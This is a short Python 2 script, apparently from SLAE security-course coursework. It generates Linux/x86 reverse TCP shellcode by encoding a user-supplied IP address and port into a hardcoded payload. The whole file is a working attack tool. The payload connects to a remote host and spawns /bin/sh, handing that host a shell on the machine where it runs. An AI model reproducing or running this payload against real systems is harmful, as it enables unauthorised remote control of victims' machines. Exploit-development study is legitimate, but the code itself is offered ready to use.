#!/usr/bin/python
 
# SLAE - Assignment #2: Shell Reverse TCP Shellcode (Linux/x86) Wrapper
# Author:  H4554n AlMusajjen (@HAlmusajjen)
# Website: https://h4554nalmusajjen.wordpress.com/
import sys




def rethex(n):
	h1 = hex(int(n))[2:]
	
	if len(h1) == 3:
		h1 = "0" + h1

	if len(h1) >= 3:
		t1 = h1[0:2]
		t2 = h1[2:4]
		h1 = "\\x" + t1 + "\\x" + t2

	if len(h1) < 4 and len(h1) > 2:
		h1 = "0" + h1
	if len(h1) < 2:
		h1="\\x0" + h1
	if len(h1) == 2:
		h1="\\x" + h1
	if h1 == "\\x00":
		print "Oops, looks like the final shellcode contains a \\x00 :(!\r\n"
		exit()
	return h1	

total = len(sys.argv)
if total != 3:
	print "Usage: python linux_x86_shell_reverse_tcp.py [ip] [port]"
else:
	try:
		ip = sys.argv[1]
		addr = ""
		for i in range(0,4):
			addr = addr + rethex(ip.split(".",3)[i])			
		print "Shellcode-ready address: " + addr 

		port = sys.argv[2]
		if int(port) > 65535:
			print "Port is greater than 65535!"
			exit()
		if port < 1024:
			print "Port is smaller than 1024! Remember u need r00t for this ;)"
			exit()	
		
		shellport = rethex(port) 
		print "Shellcode-ready port: " + shellport
 
		shellcode = ("\\x31\\xdb\\x6a\\x66\\x58\\x99\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68"+addr+"\\x68\\x02\\x00"+shellport+"\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80")
		print "Final shellcode:\r\b\"" + shellcode + "\""
 
	except:
		print "exiting..."
